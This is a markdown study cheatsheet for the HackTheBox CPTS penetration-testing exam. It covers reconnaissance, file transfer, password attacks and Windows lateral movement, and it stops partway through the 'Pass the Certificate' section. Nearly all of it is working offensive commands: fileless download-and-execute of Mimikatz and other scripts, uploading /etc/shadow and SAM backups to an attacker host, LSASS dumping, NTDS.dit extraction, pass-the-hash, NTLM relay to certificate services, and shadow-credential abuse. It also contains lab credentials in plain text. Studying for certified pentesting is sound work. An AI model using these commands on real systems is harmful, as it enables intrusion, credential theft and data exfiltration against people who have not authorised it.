# CPTS-cheatsheet
HackTheBox Certified Penetration Tester Specialist Cheatsheet

![Alt text](https://academy.hackthebox.com/storage/exam_overview_banners/Fpoo8YaykR3341XtswrcmuyLNcAK6bZ1WF86Ro6v.png)

**Table of Contents**
- [Tmux](#tmux)
- [Nmap](#nmap)
  - [Address Scanning](#nmap-address-scanning)
  - [Scanning Techniques](#nmap-scanning-techniques)
  - [Host Discovery](#nmap-host-discovery)
  - [Port Scan](#nmap-port-scan)
  - [OS and Service Detection](#nmap-os-and-service-detection)
  - [Timing and Performance](#nmap-timing-and-performance)
  - [NSE Scripts](#nse-scripts)
  - [Evasion and Spoofing](#firewall-evasion-and-spoofing)
  - [Output](#output)
- [Footprinting Services](#footprinting-services)
    - [FTP](#ftp)
    - [SMB](#smb)
    - [NFS](#nfs)
    - [DNS](#dns)
    - [IMAP POP3](#imap-pop3)
    - [SNMP](#snmp)
    - [MSSQL](#mssql)
    - [IPMI](#ipmi)
    - [Linux Remote Management SSH](#linux-remote-management-ssh)
    - [Windows Remote Management SSH](#linux-remote-management-ssh)
    - [Oracle TNS](#oracle-tns)
- [File Transfers](#file-transfers)
    - [Windows File Transfer Methods](#windows-file-transfer-methods)
    - [Linux File Transfer Methods](#linux-file-transfer-methods)
    - [Transferring Files with Code](#transferring-files-with-code)
- [Password Attacks](#password-attacks)
    - [Password Mutations](#password-mutations)
    - [Remote Password Attacks](#remote-local-password-attacks)
    - [Windows Local Password Attacks](#windows-local-password-attacks)
    - [Linux Local Password Attacks](#linux-password-attacks)
    - [Credential Hunting In Network Traffic](#credential-hunting-in-network-traffic)
    - [Credential Hunting in Network Shares](#credential-hunting-in-network-shares)
    - [Cracking Passwords](#cracking-passwords)
- [Windows Lateral Movement Techniques](#windows-lateral-movement-techniques)
    - [Pass the Hash(PTH)](#pass-the-hash)
    - [Pass the Ticket from Windows(PtT)](#pass-the-ticket-from-windows)
    - [Pass the Ticket from Linux(PtT)](#pass-the-ticket-from-linux)
    - [Pass the Certificate(PtC)](#pass-the-certificate)
- [Attacking Common Services](#attacking-common-services)
    - [Attacking SMB](#attacking-smb)
    - [Attacking SQL](#attacking-sql)
    - [Attacking RDP Services](#attacking-rdp-services)
    - [Attacking DNS Services](#attacking-dns-services)
    - [Attacking Email Services](#attacking-email-services)
- [Pivoting, Tunneling, and Port Forwarding](#pivoting-tunneling-and-port-forwarding)
    - [Dynamic Port Forwarding with SSH and SOCKS Tunneling](#dynamic-port-forwarding-with-ssh-and-socks-tunneling)
    - [Remote or Reverse Port Forwarding with SSH](#remote-or-reverse-port-forwarding-with-ssh)
    - [Meterpreter Tunneling and Port Forwarding](#meterpreter-tunneling-and-port-forwarding)
    - [Socat Redirection with a Reverse Shell or Bind Shell](#Socat-Redirection-with-a-Reverse-Shell-or-Bind-Shell)
    - [SSH for Windows with Plink](#SSH-for-Windows-with-plink)
    - [SSH Pivoting with Sshuttle](#SSH-Pivoting-with-Sshuttle)
    - [Web Server Pivoting with Rpivot](#Web-Server-Pivoting-with-Rpivot)
    - [Port Forwarding with Windows Netsh](#Port-Forwarding-with-Windows-Netsh)
    - [DNS Tunneling with Dnscat2](#DNS-Tunneling-with-Dnscat2)
    - [SOCKS5 Tunneling with Chisel](#SOCKS5-Tunneling-with-Chisel)
    - [ICMP Tunneling with SOCKS](#ICMP-Tunneling-with-SOCKS)
    - [RDP and SOCKS Tunneling with SocksOverRDP](#RDP-and-SOCKS-Tunneling-with-SocksOverRDP)
    - [Pivoting with ligolo-ng](#Pivoting-with-ligolo-ng)
- [Active Directory](#active-directory)
    - [Tools of the Trade](#Tools-of-the-Trade)
    - [Initial Enumeration](#initial-enumeration)
    - [LLMNR/NTB-NS Poisoning](#llmnr/NTB-NS-poisoning)
    - [Password Spraying & Password Policies](#password-spraying-and-password-policies)
    - [Enumerating Disabling/Bypassing AV](#enumerating-and-bypassing-av)
    - [Enumerating Security Controls](#Enumerating-Security-Controls)
    - [Credentialed Enumeration From Linux](#Credentialed-Enumeration-From-Linux)
    - [Credentialed Enumeration From Windows](#Credentialed-Enumeration-From-Windows)  
    - [Credentialed Enumeration From Windows with PowerView](#Credentialed-Enumeration-From-Windows-with-PowerView)  
    - [Enumeration by Living Off the Land](#Enumeration-by-Living-Off-the-Land)
    - [Kerberoasting](#kerberoasting)
    - [ACL Enumeration & Tactics](#acl-enumeration-and-tactics)
    - [DCSync Attack](#dcsync-attack)
    - [Privileged Access](#Privileged-Access)
    - [Kerberos "Double Hop" Problem](#Kerberos-"Double-Hop"-Problem)
    - [Bleeding Edge Vulnerabilities](#Bleeding-Edge-Vulnerabilities)
    - [Miscellanous Configurations](#miscellanous-configurations)
    - [ASREPRoasting](#asreproasting)
    - [Group Policy Object (GPO) Abuse](#Group-Policy-Object-(GPO)-Abuse)
    - [Domain Trusts Primer](#Domain-Trusts-Primer)
    - [BloodHound: Domain Trusts & Cross-Forest Analysis](#BloodHound:-Domain-Trusts-and-Cross-Forest-Analysis)
    - [Trust Relationships Child-Parent Trusts](#trust-relationships-child-parent-trusts)
    - [Trust Relationships Cross-Forest Trust](#Trust-Relationships-Cross-Forest-Trust)
    - [AD Auditing Toolkit](#AD-Auditing-Toolkit)
- [Login Brute Forcing](#login-brute-forcing)
    - [Hydra](#hydra)
- [SQLMap](#sqlmap)

- [Bash Line Editing Shortcut](#Bash-Line-Editing-Shortcut)
- [bloodhound](#bloodhound)
- [netexec](#netexec)
- [certipy](#certipy)
- [autobloodyAD](#autobloodyAD)
- [bloodyAD](#bloodyAD)
- [impacket](#impacket)
- [Metasploit](#Metasploit)
- [smbclient](#smbclient)
- [gobuster](#gobuster)
- [Step to privilege escalation in AD](#Step-to-escal)
- [useful command](#useful-command)
- 
- [Useful Resources](#useful-resources)



## [Tmux](https://tmuxcheatsheet.com/)
```
# Start a new tmux session
tmux new -s <name>

# Start a new session or attach to an existing session named mysession
tmux new-session -A -s <name>

# List all sessions
tmux ls

# kill/delete session
tmux kill-session -t <name>

# kill all sessions but current
tmux kill-session -a

# attach to last session
tmux a
tmux a -t <name>

# start/stop logging with tmux logger
prefix + [Shift + P]

# split tmux pane vertically
prefix + [Shift + %}

# split tmux pane horizontally
prefix + [Shift + "]

# switch between tmux panes
prefix + [Shift + O]
```

## [NMAP](https://www.stationx.net/nmap-cheat-sheet/)
#### Nmap address scanning
```
# Scan a single IP
nmap 192.168.1.1

# Scan multiple IPs
nmap 192.168.1.1 192.168.1.2

# Scan a range
nmap 192.168.1.1-254

# Scan a subnet
nmap 192.168.1.0/24
```
#### Nmap scanning techniques
```
# TCP SYN port scan (Default)
nmap -sS 192.168.1.1

# TCP connect port scan (Default without root privilege)
nmap -sT 192.168.1.1

# UDP port scan
nmap -sU 192.168.1.1

# TCP ACK port scan
nmap  -sA 192.168.1.1
```
#### Nmap Host Discovery
```
# Disable port scanning. Host discovery only.
nmap -sn 192.168.1.1

# Disable host discovery. Port scan only.
nmap -Pn 192.168.1.1

# Never do DNS resolution
nmap -n 192.168.1.1

```

#### Nmap port scan
```
# Port scan from service name
nmap 192.168.1.1 -p http, https

# Specific port scan
nmap 192.168.1.1 -p 80,9001,22

# All ports
nmap 192.168.1.1 -p-

# Fast scan 100 ports
nmap -F 192.168.1.1

# Scan top ports
nmap 192.168.1.1 -top-ports 200
```

#### Nmap OS and service detection
```
# Aggresive scanning (Bad Opsec). Enables OS detection, version detection, script scanning, and traceroute.
nmap -A 192.168.1.1

# Version detection scanning
nmap -sV 192.168.1.1

# Version detection intensity from 0-9
nmap -sV -version-intensity 7 192.168.1.1

# OS detecion
nmap -O 192.168.1.1

# Hard OS detection intensity
nmap -O -osscan-guess 192.168.1.1
```

#### Nmap timing and performance
```
# Paranoid (0) Intrusion Detection System evasion
nmap 192.168.1.1 -T0

# Insane (5) speeds scan; assumes you are on an extraordinarily fast network
nmap 192.168.1.1 -T5

# Send packets no slower than <number> per second
nmap 192.168.1.1 --min-rate 1000
```
#### NSE Scripts
```
# Scan with a single script. Example banner
nmap 192.168.1.1 --script=banner

# NSE script with arguments
nmap 192.168.1.1 --script=banner --script-args <arguments>
```
#### Firewall Evasion and Spoofing
```
# Requested scan (including ping scans) use tiny fragmented IP packets. Harder for packet filters
nmap -f 192.168.1.1

# Set your own offset size(8, 16, 32, 64)
nmap 192.168.1.1 --mtu 32

# Send scans from spoofed IPs
nmap 192.168.1.1 -D 192.168.1.11, 192.168.1.12, 192.168.1.13, 192.168.1.13 
```
#### Output
```
# Normal output to the file normal.file
nmap 192.168.1.1 -oN scan.txt

# Output in the three major formats at once
nmap 192.168.1.1 -oA scan
```
## Footprinting Services
##### FTP
```
# Connect to FTP
ftp <IP>

# Interact with a service on the target.
nc -nv <IP> <PORT>

# Download all available files on the target FTP server
wget -m --no-passive ftp://anonymous:anonymous@<IP>
```
##### SMB
```

# Connect to a specific SMB share
smbclient //<FQDN IP>/<share>

# Interaction with the target using RPC
rpcclient -U "" <FQDN IP>

# Enumerating SMB shares using null session authentication.
crackmapexec smb <FQDN/IP> --shares -u '' -p '' --shares

# Username enumeration using Impacket scripts.
samrdump.py <FQDN/IP>

# SMB enumeration using enum4linux.
enum4linux-ng.py <FQDN/IP> -A

# Enumerating SMB shares.
smbmap -H <FQDN/IP>
```
##### NFS
```
# Show available NFS shares
showmount -e <IP>

# Mount the specific NFS share.umount ./target-NFS
mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock
```
##### DNS
```
# NS request to the specific nameserver.
dig ns <domain.tld> @<nameserver>

# ANY request to the specific nameserver
dig any <domain.tld> @<nameserver>

# AXFR request to the specific nameserver.
dig axfr <domain.tld> @<nameserver>

# Subdomain brute forcing.
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

##### IMAP POP3
```
# Log in to the IMAPS service using cURL
curl -k 'imaps://<FQDN/IP>' --user <user>:<password>

# Connect to the IMAPS service
openssl s_client -connect <FQDN/IP>:imaps

# Connect to the POP3s service
openssl s_client -connect <FQDN/IP>:pop3s
```

#### SNMP
```
# Querying OIDs using snmpwalk
snmpwalk -v2c -c <community string> <FQDN/IP>

# Bruteforcing community strings of the SNMP service.
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt <FQDN/IP>

# Bruteforcing SNMP service OIDs.
braa <community string>@<FQDN/IP>:.1.*
```
##### MSSQL
```
impacket-mssqlclient <user>@<FQDN/IP> -windows-auth
```
##### IPMI
```
# IPMI version detection
msf6 auxiliary(scanner/ipmi/ipmi_version)

# Dump IPMI hashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)
```
##### Linux Remote Management SSH
```
# Enforce password-based authentication
ssh <user>@<FQDN/IP> -o PreferredAuthentications=password
```
##### Windows Remote Management SSH
```
# Check the security settings of the RDP service.
rdp-sec-check.pl <FQDN/IP>
```
##### Oracle TNS
```
# Perform a variety of scans to gather information about the Oracle database services and its components.
./odat.py all -s <FQDN/IP>

# Log in to the Oracle database.
sqlplus <user>/<pass>@<FQDN/IP>/<db>

# Upload a file with Oracle RDBMS.
./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt
```
## File Transfers

https://gist.github.com/HarmJ0y/bb48307ffa663256e239

##### Windows File Transfer Methods
```
# Download a File Using Bitsadmin 
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
or
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"

# Download a File Using Certutil 
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe

# Download a File Using Certutil 
certutil.exe -urlcache -f http://10.10.15.8:8000/mimikatz.exe mimikatz.exe

# Download a file with PowerShell with Synchronous 
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

# Download a file with PowerShell with Asynchronous 
(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')

# Execute a file in memory using PowerShell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

# Execute a file in memory using PowerShell
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

# Download a file with PowerShell
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

# Download a file via smbshare
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

net use n: \\192.168.220.133\share /user:test test

# Download a file via FTP 
sudo python3 -m pyftpdlib --port 21

(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

# Download a file via impacket-smbclient
impacket-smbclient 'mlefay':'Plain Human work!'@172.16.5.35
smbclient:>
use Users
cd mlefay/Documents
get sam.bak


(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')

# Upload a file via WebServer 
pip3 install uploadserver
python3 -m uploadserver

Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
or
curl.exe -F "files=@C:\Users\mlefay\Documents\security.bak" http://192.168.49.128:8000/upload


# Upload a file via smbshare 
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\share\

# Upload a file via FTP  
sudo python3 -m pyftpdlib --port 21 --write

(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')

```
##### Linux File Transfer Methods
```
# Download a File Using NetCat 
nc -l -p 8000 > SharpKatz.exe

nc -q 0 192.168.49.128 8000 < SharpKatz.exe

# Download a file using Wget
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh

# Fileless Download with Wget
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

# Download a File Using cURL
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

# Fileless Download with cURL
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash

# Download a file using SCP
scp plaintext@192.168.49.128:/root/myroot.txt .

# Upload a file via WebServer 
sudo python3 -m pip install --user uploadserver
sudo python3 -m uploadserver 4443

curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure

# Upload a file using SCP
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/

```
##### Transferring Files with Code
```
# Download a File Using python3
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'

# Download a File Using PHP 
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

# Download a File Using Ruby  
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'

# Download a File Using Perl   
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'

```
## Password Attacks

##### Password Mutations
```
# Uses cewl to generate a wordlist based on keywords present on a website.
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

# Uses Hashcat to generate a rule-based word list.
hashcat --force password.list -r custom.rule --stdout > mut_password.list

# Users username-anarchy tool in conjunction with a pre-made list of first and last names to generate a list of potential username.
./username-anarchy -i /path/to/listoffirstandlastnames.txt
```

##### Remote Password Attacks
```
# Uses Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.
hydra -L user.list -P password.list <service>://<ip>

# Uses Hydra in conjunction with a list of credentials to attempt to login to a target over the specified service. This can be used to attempt a credential stuffing attack.
hydra -C <user_pass.list> ssh://<IP>

# Uses netexec in conjunction with admin credentials to dump password hashes stored in SAM, over the network. ( need priv LOCAL ADMIN to dump SAM ) 
netexec smb <ip> --local-auth -u <username> -p <password> --sam

# Uses netexec in conjunction with admin credentials to dump lsa secrets, over the network. It is possible to get clear-text credentials this way. ( need priv LOCAL ADMIN to dump LSA secrets ) 
netexec smb <ip> --local-auth -u <username> -p <password> --lsa

# Uses netexec in conjunction with admin credentials to dump hashes from the ntds file over a network.( need priv DOMAIN ADMIN to dump NTDS.dit) 
netexec smb <ip> -u <username> -p <password> --ntds
```
##### Windows Local Password Attacks
```
# Access the Credential Manager prompt to backup or restore saved credentials
rundll32 keymgr.dll,KRShowKeyMgr

# Enumerate credentials stored in the current user's profile
cmdkey /list

# Launch a new instance of cmd.exe while impersonating a stored user.
runas /savecred /user:<username> cmd

# Uses LaZagne tool to discover credentials that web browsers or other installed applications may insecurely store.
start LaZagne.exe all

# Uses Windows command-line based utility findstr to search for the string "password" in many different file type.
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

# A Powershell cmdlet is used to display process information. Using this with the LSASS process can be helpful when attempting to dump LSASS process memory from the command line.
Get-Process lsass

# Uses rundll32 in Windows to create a LSASS memory dump file. This file can then be transferred to an attack box to extract credentials.
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# Uses Pypykatz to parse and attempt to extract credentials & password hashes from an LSASS process memory dump file.
pypykatz lsa minidump /path/to/lsassdumpfile

# Uses reg.exe in Windows to save a copy of a registry hive at a specified location on the file system. It can be used to make copies of any registry hive (i.e., hklm\sam, hklm\security, hklm\system).
reg.exe save hklm\sam C:\sam.save

# Uses move in Windows to transfer a file to a specified file share over the network.
move sam.save \\<ip>\NameofFileShare

# Uses Secretsdump.py to dump password hashes from the SAM database.
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

( Next dump NTDS.dit need privilege Domain Admin)

# Uses Windows command line based tool vssadmin to create a volume shadow copy for C:. This can be used to make a copy of NTDS.dit safely.
vssadmin CREATE SHADOW /For=C:

# Uses Windows command line based tool copy to create a copy of NTDS.dit for a volume shadow copy of C:.
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

# Uses impacket-secretsdump to dump password hashes from the NTDS.dit by using 2 file NTDS.dit , system.save 
impacket-secretsdump -ntds NTDS.dit -system system.save LOCAL
```
##### Linux Local Password Attacks
```
# Script that can be used to find .conf, .config and .cnf files on a Linux system.
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done

# Script that can be used to find credentials in specified file types.
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user|password|pass" $i 2>/dev/null | grep -v "\#";done

# Script that can be used to find common database files.
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man";done

# Script that can be used to search for common file types used with scripts.
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share";done

# Script used to look for common types of documents.
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib|fonts|share|core" ;done

# Uses Linux-based find command to search for text files.
find /home/* -type f -name "*.txt" -o ! -name "*.*"

# Uses Linux-based command grep to search the file system for key terms PRIVATE KEY to discover SSH keys.
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"

# Uses Linux-based tail command to search the through bash history files and output the last 5 lines..
grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

# Uses Mimipenguin to find creds in memory and cache
sudo python3 mimipenguin.py

# Runs Mimipenguin.sh using bash.
sudo bash mimipenguin.sh

# Uses laZagne to find creds from various source
sudo python2.7 laZagne.py all

# Runs laZagne.py browsers module using Python 3.
sudo python3 laZagne.py browsers

# Uses Linux-based command to search for credentials stored by Firefox then searches for the keyword default using grep.
ls -l .mozilla/firefox/ | grep default

# Uses Linux-based command cat to search for credentials stored by Firefox in JSON.
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

# 	Runs Firefox_decrypt.py to decrypt any encrypted credentials stored by Firefox. Program will run using python3.9.
python3.9 firefox_decrypt.py  
```
##### Credential Hunting In Network Traffic
```
# Uses Pcredz to extract credentials from live traffic or network packet captures. (https://github.com/lgandx/PCredz)
./Pcredz -f demo.pcapng -t -v
```
##### Credential Hunting in Network Shares
```
# Search network shares for interesting files and credentials by Snaffler .  ( https://github.com/SnaffCon/Snaffler )
snaffler.exe -s

# Search network shares for interesting files and save the results by PowerHuntShares.  ( https://github.com/NetSPI/PowerHuntShares )
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public

# Search network shares for interesting credentials  by MANSPIDER.(https://github.com/blacklanternsecurity/MANSPIDER)
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'password' -u 'mendres' -p 'Inlanefreight2025!'
```
##### Cracking Passwords
```
# Uses Hashcat to attempt to crack a single NTLM hash and display the results in the terminal output.
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show

# Runs John in conjunction with a wordlist to crack a pdf hash.
john --wordlist=rockyou.txt pdf.hash

# Uses unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Uses Hashcat in conjunction with a wordlist to crack the unshadowed hashes and outputs the cracked hashes to a file called unshadowed.cracked.
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.
office2john.py Protected.docx > protected-docx.hash  
```
## Windows Lateral Movement Techniques

##### Pass the Hash
```
# Pass the Hash from Windows Using Mimikatz to spawn new cmd.exe process under the identity of user julio using their NTLM hash
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /NTLM:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

# Pass the Hash with Impacket (Linux) 
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
or
impacket-atexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
or
impacket-smbexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
or
impacket-wmiexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453


# Pass the Hash with NetExec
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453

# Pass the Hash with NetExec and execute command
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami

# Pass the Hash with evil-winrm
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

# Pass the Hash with RDP ( Enable Restricted Admin Mode to allow PtH )
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B

```
##### Pass the Ticket from Windows
```
# Harvesting Kerberos tickets from Windows by mimikatz ( it wil export ticket to file .kirbi ) 
mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit

# Harvesting Kerberos tickets from Windows by Rubeus   ( it wil export ticket to file .kirbi )
Rubeus.exe dump /nowrap

(when Exported tickets fail or ticket has expired , we can run below command to extracted Encryption Keys to generate new tickets )

# Mimikatz - Extract Kerberos keys  ( we can get AES256_HMAC and  RC4_HMAC key )  ( RC4_HMAC same NTLM hash) 
mimikatz.exe privilege::debug "sekurlsa::ekeys" exit

# Mimikatz - Pass the Key aka. OverPass the Hash ( using RC4_HMAC same NTLM hash ) ( spawn new cmd.exe process under the identity of user plaintext )
mimikatz.exe privilege::debug "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /rc4:<RC4_HMAC or NTLM>" exit

# Rubeus - Pass the Key aka. OverPass the Hash ( using AES256_HMAC ) 
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<AES256_HMAC> /nowrap

(Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.SO SHOULD USE RUBEUS )

# Rubeus - Pass the Ticket ( using RC4_HMAC same NTLM ) 
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:<RC4_HMAC or NTLM> /ptt

# Rubeus - Pass the Ticket ( using file ticket .kirbi ) 
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi

# Mimikatz - Pass the Ticket ( using file ticket .kirbi ) ( current command prompt have priv user plaintext) 
mimikatz.exe privilege::debug "kerberos::ptt C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi" exit

# Mimikatz - Pass the Ticket ( using file ticket .kirbi ) ( spawn new cmd have priv user plaintext ) 
mimikatz.exe privilege::debug "kerberos::ptt C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi" "misc::cmd" exit

```
##### Pass the Ticket from Linux
```
# realm - Check if Linux machine is domain-joined
realm list

# PS - Check if Linux machine is domain-joined
ps -ef | grep -i "winbind\|sssd"

# Using Find to search for files with keytab in the name (To use a keytab file, we must have read and write (rw) privileges on the file.)
find / -name *keytab* -ls 2>/dev/null

# Reviewing environment variables for ccache files.
env | grep -i krb5

# Using Find to search for files with krb5cc in the name   
find / -name *krb5cc* -ls 2>/dev/null

# Searching for ccache files in /tmp
find /tmp -name *krb5cc* -ls 2>/dev/null

# Confirm which ticket we are using
klist

# Listing KeyTab file information
list -k -t /opt/specialfiles/carlos.keytab

# Impersonating a user with a KeyTab
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# Extracting KeyTab hashes with KeyTabExtract  ( https://github.com/sosdave/KeyTabExtract )
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

# Impersonating a user with a KeyTab
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab

# Setting the KRB5CCNAME environment variable
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133

# Impacket Ticket converter file ccache to kirbi  ( https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py) 
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

# Importing converted ticket into Windows session with Rubeus
C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi

# using Linikatz tool to  exploiting credentials on Linux machines when there is an integration with Active Directory   ( https://github.com/CiscoCXSecurity/linikatz ) 
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh

```
##### Pass the Certificate
```
(AD CS NTLM Relay Attack (ESC8)) 
# use Impacket’s ntlmrelayx to listen for inbound connections and relay them to the web enrollment service ( relay NTLM authenticate and get file certificate .pfx ) 
impacket-ntlmrelayx -debug -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication

# force machine accounts to authenticate against arbitrary hosts is by exploiting the printer bug
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12

# install gettgtpkinit.py  and setting environment
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
pip3 install -I git+https://github.com/wbond/oscrypto.git

#  perform a Pass-the-Certificate attack to obtain a TGT by file certificate .pfx and save to file .ccache
python3 gettgtpkinit.py -cert-pfx DC01$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache

# Once successfully obtain a TGT, next perform Pass-the-Ticket (PtT) to dump all hash  ( machine account DC01$ have priv same Domain Admins)
export KRB5CCNAME=/tmp/dc.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

(Shadow Credentials (msDS-KeyCredentialLink))
# use pywhisker to generates an X.509 certificate and writes the public key to the victim user's msDS-KeyCredentialLink attribute ( https://github.com/ShutdownRepo/pywhisker ) 
pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add 

# In the command above, we can see that a PFX (PKCS12) file was created (eFUVVTPf.pfx), and the password is shown. We will use this file with gettgtpkinit.py to acquire a TGT as the victim
python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

# With the TGT obtained, we may once again pass the ticket
